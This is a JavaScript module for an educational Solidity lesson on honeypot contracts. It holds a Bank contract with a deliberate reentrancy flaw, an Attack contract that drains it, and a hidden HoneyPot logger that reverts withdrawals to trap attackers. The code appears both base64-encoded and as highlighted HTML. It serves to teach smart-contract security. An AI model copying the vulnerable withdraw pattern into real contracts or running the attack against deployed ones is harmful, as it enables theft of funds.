// metadata
export const version = "0.8.24"
export const title = "Honeypot"
export const description = "An example of honeypot in Solidity"

export const keywords = ["hack", "security", "honeypot"]

export const codes = [
  {
    fileName: "HoneyPot.sol",
    code: "Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4yNDsKCi8qCkJhbmsgaXMgYSBjb250cmFjdCB0aGF0IGNhbGxzIExvZ2dlciB0byBsb2cgZXZlbnRzLgpCYW5rLndpdGhkcmF3KCkgaXMgdnVsbmVyYWJsZSB0byB0aGUgcmVlbnRyYW5jeSBhdHRhY2suClNvIGEgaGFja2VyIHRyaWVzIHRvIGRyYWluIEV0aGVyIGZyb20gQmFuay4KQnV0IGFjdHVhbGx5IHRoZSByZWVudHJhY3kgZXhwbG9pdCBpcyBhIGJhaXQgZm9yIGhhY2tlcnMuCkJ5IGRlcGxveWluZyBCYW5rIHdpdGggSG9uZXlQb3QgaW4gcGxhY2Ugb2YgdGhlIExvZ2dlciwgdGhpcyBjb250cmFjdCBiZWNvbWVzCmEgdHJhcCBmb3IgaGFja2Vycy4gTGV0J3Mgc2VlIGhvdy4KCjEuIEFsaWNlIGRlcGxveXMgSG9uZXlQb3QKMi4gQWxpY2UgZGVwbG95cyBCYW5rIHdpdGggdGhlIGFkZHJlc3Mgb2YgSG9uZXlQb3QKMy4gQWxpY2UgZGVwb3NpdHMgMSBFdGhlciBpbnRvIEJhbmsuCjQuIEV2ZSBkaXNjb3ZlcnMgdGhlIHJlZW50cmFuY3kgZXhwbG9pdCBpbiBCYW5rLndpdGhkcmF3IGFuZCBkZWNpZGVzIHRvIGhhY2sgaXQuCjUuIEV2ZSBkZXBsb3lzIEF0dGFjayB3aXRoIHRoZSBhZGRyZXNzIG9mIEJhbmsKNi4gRXZlIGNhbGxzIEF0dGFjay5hdHRhY2soKSB3aXRoIDEgRXRoZXIgYnV0IHRoZSB0cmFuc2FjdGlvbiBmYWlscy4KCldoYXQgaGFwcGVuZWQ/CkV2ZSBjYWxscyBBdHRhY2suYXR0YWNrKCkgYW5kIGl0IHN0YXJ0cyB3aXRoZHJhd2luZyBFdGhlciBmcm9tIEJhbmsuCldoZW4gdGhlIGxhc3QgQmFuay53aXRoZHJhdygpIGlzIGFib3V0IHRvIGNvbXBsZXRlLCBpdCBjYWxscyBsb2dnZXIubG9nKCkuCkxvZ2dlci5sb2coKSBjYWxscyBIb25leVBvdC5sb2coKSBhbmQgcmV2ZXJ0cy4gVHJhbnNhY3Rpb24gZmFpbHMuCiovCgpjb250cmFjdCBCYW5rIHsKICAgIG1hcHBpbmcoYWRkcmVzcyA9PiB1aW50MjU2KSBwdWJsaWMgYmFsYW5jZXM7CiAgICBMb2dnZXIgbG9nZ2VyOwoKICAgIGNvbnN0cnVjdG9yKExvZ2dlciBfbG9nZ2VyKSB7CiAgICAgICAgbG9nZ2VyID0gTG9nZ2VyKF9sb2dnZXIpOwogICAgfQoKICAgIGZ1bmN0aW9uIGRlcG9zaXQoKSBwdWJsaWMgcGF5YWJsZSB7CiAgICAgICAgYmFsYW5jZXNbbXNnLnNlbmRlcl0gKz0gbXNnLnZhbHVlOwogICAgICAgIGxvZ2dlci5sb2cobXNnLnNlbmRlciwgbXNnLnZhbHVlLCAiRGVwb3NpdCIpOwogICAgfQoKICAgIGZ1bmN0aW9uIHdpdGhkcmF3KHVpbnQyNTYgX2Ftb3VudCkgcHVibGljIHsKICAgICAgICByZXF1aXJlKF9hbW91bnQgPD0gYmFsYW5jZXNbbXNnLnNlbmRlcl0sICJJbnN1ZmZpY2llbnQgZnVuZHMiKTsKCiAgICAgICAgKGJvb2wgc2VudCwpID0gbXNnLnNlbmRlci5jYWxse3ZhbHVlOiBfYW1vdW50fSgiIik7CiAgICAgICAgcmVxdWlyZShzZW50LCAiRmFpbGVkIHRvIHNlbmQgRXRoZXIiKTsKCiAgICAgICAgYmFsYW5jZXNbbXNnLnNlbmRlcl0gLT0gX2Ftb3VudDsKCiAgICAgICAgbG9nZ2VyLmxvZyhtc2cuc2VuZGVyLCBfYW1vdW50LCAiV2l0aGRyYXciKTsKICAgIH0KfQoKY29udHJhY3QgTG9nZ2VyIHsKICAgIGV2ZW50IExvZyhhZGRyZXNzIGNhbGxlciwgdWludDI1NiBhbW91bnQsIHN0cmluZyBhY3Rpb24pOwoKICAgIGZ1bmN0aW9uIGxvZyhhZGRyZXNzIF9jYWxsZXIsIHVpbnQyNTYgX2Ftb3VudCwgc3RyaW5nIG1lbW9yeSBfYWN0aW9uKQogICAgICAgIHB1YmxpYwogICAgewogICAgICAgIGVtaXQgTG9nKF9jYWxsZXIsIF9hbW91bnQsIF9hY3Rpb24pOwogICAgfQp9CgovLyBIYWNrZXIgdHJpZXMgdG8gZHJhaW4gdGhlIEV0aGVycyBzdG9yZWQgaW4gQmFuayBieSByZWVudHJhbmN5Lgpjb250cmFjdCBBdHRhY2sgewogICAgQmFuayBiYW5rOwoKICAgIGNvbnN0cnVjdG9yKEJhbmsgX2JhbmspIHsKICAgICAgICBiYW5rID0gQmFuayhfYmFuayk7CiAgICB9CgogICAgZmFsbGJhY2soKSBleHRlcm5hbCBwYXlhYmxlIHsKICAgICAgICBpZiAoYWRkcmVzcyhiYW5rKS5iYWxhbmNlID49IDEgZXRoZXIpIHsKICAgICAgICAgICAgYmFuay53aXRoZHJhdygxIGV0aGVyKTsKICAgICAgICB9CiAgICB9CgogICAgZnVuY3Rpb24gYXR0YWNrKCkgcHVibGljIHBheWFibGUgewogICAgICAgIGJhbmsuZGVwb3NpdHt2YWx1ZTogMSBldGhlcn0oKTsKICAgICAgICBiYW5rLndpdGhkcmF3KDEgZXRoZXIpOwogICAgfQoKICAgIGZ1bmN0aW9uIGdldEJhbGFuY2UoKSBwdWJsaWMgdmlldyByZXR1cm5zICh1aW50MjU2KSB7CiAgICAgICAgcmV0dXJuIGFkZHJlc3ModGhpcykuYmFsYW5jZTsKICAgIH0KfQoKLy8gTGV0J3Mgc2F5IHRoaXMgY29kZSBpcyBpbiBhIHNlcGFyYXRlIGZpbGUgc28gdGhhdCBvdGhlcnMgY2Fubm90IHJlYWQgaXQuCmNvbnRyYWN0IEhvbmV5UG90IHsKICAgIGZ1bmN0aW9uIGxvZyhhZGRyZXNzIF9jYWxsZXIsIHVpbnQyNTYgX2Ftb3VudCwgc3RyaW5nIG1lbW9yeSBfYWN0aW9uKQogICAgICAgIHB1YmxpYwogICAgewogICAgICAgIGlmIChlcXVhbChfYWN0aW9uLCAiV2l0aGRyYXciKSkgewogICAgICAgICAgICByZXZlcnQoIkl0J3MgYSB0cmFwIik7CiAgICAgICAgfQogICAgfQoKICAgIC8vIEZ1bmN0aW9uIHRvIGNvbXBhcmUgc3RyaW5ncyB1c2luZyBrZWNjYWsyNTYKICAgIGZ1bmN0aW9uIGVxdWFsKHN0cmluZyBtZW1vcnkgX2EsIHN0cmluZyBtZW1vcnkgX2IpCiAgICAgICAgcHVibGljCiAgICAgICAgcHVyZQogICAgICAgIHJldHVybnMgKGJvb2wpCiAgICB7CiAgICAgICAgcmV0dXJuIGtlY2NhazI1NihhYmkuZW5jb2RlKF9hKSkgPT0ga2VjY2FrMjU2KGFiaS5lbmNvZGUoX2IpKTsKICAgIH0KfQo=",
  },
]

const html = `<p>A honeypot is a trap to catch hackers.</p>
<h3>Vulnerability</h3>
<p>Combining two exploits, reentrancy and hiding malicious code, we can build a contract</p>
<p>that will catch malicious users.</p>
<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.8.24;</span>

<span class="hljs-comment">/*
Bank is a contract that calls Logger to log events.
Bank.withdraw() is vulnerable to the reentrancy attack.
So a hacker tries to drain Ether from Bank.
But actually the reentracy exploit is a bait for hackers.
By deploying Bank with HoneyPot in place of the Logger, this contract becomes
a trap for hackers. Let&#x27;s see how.

1. Alice deploys HoneyPot
2. Alice deploys Bank with the address of HoneyPot
3. Alice deposits 1 Ether into Bank.
4. Eve discovers the reentrancy exploit in Bank.withdraw and decides to hack it.
5. Eve deploys Attack with the address of Bank
6. Eve calls Attack.attack() with 1 Ether but the transaction fails.

What happened?
Eve calls Attack.attack() and it starts withdrawing Ether from Bank.
When the last Bank.withdraw() is about to complete, it calls logger.log().
Logger.log() calls HoneyPot.log() and reverts. Transaction fails.
*/</span>

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Bank</span> </span>{
    <span class="hljs-keyword">mapping</span>(<span class="hljs-keyword">address</span> <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">uint256</span>) <span class="hljs-keyword">public</span> balances;
    Logger logger;

    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params">Logger _logger</span>) </span>{
        logger <span class="hljs-operator">=</span> Logger(_logger);
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deposit</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
        balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>;
        logger.log(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>, <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>, <span class="hljs-string">"Deposit"</span>);
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdraw</span>(<span class="hljs-params"><span class="hljs-keyword">uint256</span> _amount</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        <span class="hljs-built_in">require</span>(_amount <span class="hljs-operator">&lt;</span><span class="hljs-operator">=</span> balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>], <span class="hljs-string">"Insufficient funds"</span>);

        (<span class="hljs-keyword">bool</span> sent,) <span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value</span>: _amount}(<span class="hljs-string">""</span>);
        <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);

        balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] <span class="hljs-operator">-</span><span class="hljs-operator">=</span> _amount;

        logger.log(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>, _amount, <span class="hljs-string">"Withdraw"</span>);
    }
}

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Logger</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">Log</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> caller, <span class="hljs-keyword">uint256</span> amount, <span class="hljs-keyword">string</span> action</span>)</span>;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _caller, <span class="hljs-keyword">uint256</span> _amount, <span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span> _action</span>)
        <span class="hljs-title"><span class="hljs-keyword">public</span></span>
    </span>{
        <span class="hljs-keyword">emit</span> Log(_caller, _amount, _action);
    }
}

<span class="hljs-comment">// Hacker tries to drain the Ethers stored in Bank by reentrancy.</span>
<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Attack</span> </span>{
    Bank bank;

    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params">Bank _bank</span>) </span>{
        bank <span class="hljs-operator">=</span> Bank(_bank);
    }

    <span class="hljs-function"><span class="hljs-keyword">fallback</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">address</span>(bank).<span class="hljs-built_in">balance</span> <span class="hljs-operator">&gt;</span><span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>) {
            bank.withdraw(<span class="hljs-number">1</span> <span class="hljs-literal">ether</span>);
        }
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
        bank.deposit{<span class="hljs-built_in">value</span>: <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>}();
        bank.withdraw(<span class="hljs-number">1</span> <span class="hljs-literal">ether</span>);
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBalance</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint256</span></span>) </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>).<span class="hljs-built_in">balance</span>;
    }
}

<span class="hljs-comment">// Let&#x27;s say this code is in a separate file so that others cannot read it.</span>
<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">HoneyPot</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _caller, <span class="hljs-keyword">uint256</span> _amount, <span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span> _action</span>)
        <span class="hljs-title"><span class="hljs-keyword">public</span></span>
    </span>{
        <span class="hljs-keyword">if</span> (equal(_action, <span class="hljs-string">"Withdraw"</span>)) {
            <span class="hljs-keyword">revert</span>(<span class="hljs-string">"It&#x27;s a trap"</span>);
        }
    }

    <span class="hljs-comment">// Function to compare strings using keccak256</span>
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">equal</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span> _a, <span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span> _b</span>)
        <span class="hljs-title"><span class="hljs-keyword">public</span></span>
        <span class="hljs-title"><span class="hljs-keyword">pure</span></span>
        <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bool</span></span>)
    </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">keccak256</span>(<span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encode</span>(_a)) <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-built_in">keccak256</span>(<span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encode</span>(_b));
    }
}
</code></pre>`

export default html
